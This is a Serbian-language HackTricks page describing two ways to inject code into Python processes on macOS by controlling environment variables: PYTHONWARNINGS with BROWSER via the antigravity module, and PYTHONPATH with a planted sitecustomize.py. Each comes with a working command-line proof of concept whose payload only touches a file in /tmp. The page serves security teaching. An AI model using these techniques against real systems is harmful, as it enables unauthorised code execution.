# Injekcija Python aplikacije u macOS-u

{{#include ../../../banners/hacktricks-training.md}}

## Putem promenljivih okruženja `PYTHONWARNINGS` i `BROWSER`

Ako napadač može da kontroliše okruženje Python procesa, kombinacija promenljivih `PYTHONWARNINGS` i `BROWSER` može da pokrene izvršavanje komandi kada Python uveze modul `antigravity` tokom obrade posebno kreirane opcije upozorenja. Ova tehnika se oslanja na to da `antigravity` otvara URL pomoću Python modula `webbrowser`, koji poštuje promenljivu okruženja `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Preko `PYTHONPATH` i `sitecustomize.py`

Tokom uobičajenog pokretanja, Python-ov modul `site` dodaje putanje specifične za site, a zatim pokušava da uveze modul pod nazivom `sitecustomize`. Postavljanjem direktorijuma čitljivog napadaču na prvo mesto u `PYTHONPATH`, napadač koji kontroliše okruženje procesa može naterati Python da uveze payload pre ciljne skripte. Oznaka `-S` onemogućava automatsku inicijalizaciju modula `site`, dok izolovani režim (`-I`) ignoriše `PYTHONPATH` i podrazumeva `-s` i `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hakovanje pomoću promenljivih okruženja - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook za konfiguraciju specifičan za sajt](https://docs.python.org/3/library/site.html)
- [3] [Python komandna linija i okruženje](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
